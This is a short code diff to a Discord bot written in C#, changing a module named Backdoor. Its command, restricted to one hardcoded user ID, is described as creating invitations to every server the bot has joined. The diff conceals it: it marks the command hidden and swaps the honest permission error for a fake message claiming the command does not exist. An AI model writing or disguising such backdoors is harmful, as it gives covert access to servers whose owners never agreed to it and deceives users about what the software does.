@@ -2,7 +2,7 @@
 using System.Linq;
 using System.Threading.Tasks;
 using System.Collections.Generic;
-
+using AlterBotNet.Core.Data.Classes;
 using Discord;
 using Discord.Commands;
 using Discord.Rest;
@@ -12,12 +12,13 @@ namespace AlterBotNet.Core.Moderation
 {
     public class Backdoor : ModuleBase<SocketCommandContext>
     {
+        [HiddenCommand]
         [Command("backdoor"), Summary("Crée une invitation pour tout les serveurs sur lequel le bot a été invité")]
         public async Task SendBackdoor()
         {
             if (this.Context.User.Id != 260385529474842626)
             {
-                await this.Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
+                await this.Context.Channel.SendMessageAsync($"La commande **{this.Context.Message}** n'esxiste pas");
                 return;
             }
 
